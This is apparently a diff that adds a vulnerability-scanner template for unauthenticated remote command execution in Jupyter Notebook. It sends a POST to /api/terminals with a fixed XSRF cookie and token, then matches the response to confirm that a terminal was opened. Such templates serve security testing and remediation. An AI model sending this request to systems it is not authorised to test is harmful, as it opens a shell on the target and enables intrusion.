@@ -1,0 +1,34 @@
+id: jupyter-notebook-rce
+brief:
+    title: Jupyter Notebook - Remote Command Execution
+    by: HuTa0
+    level: high
+    about: Jupyter Notebook is an interactive Notebook, computer application is a web based visualization, Jupyter Notebook API/terminals path there are loopholes in the remote command execution.
+    label:
+        - jupyter
+        - notebook
+        - rce
+        - bypass
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/api/terminals'
+      head:
+        Cookie: _xsrf=2|7a4faae0|819f5adf7edaef5e74502c9d0c75a604|1653492335
+        X-XSRFToken: 2|7a4faae0|819f5adf7edaef5e74502c9d0c75a604|1653492335
+      signs:
+        - "on": word
+          has:
+            - '"name":'
+            - '"last_activity":'
+          in: body
+          need: all
+        - "on": word
+          has:
+            - application/json
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
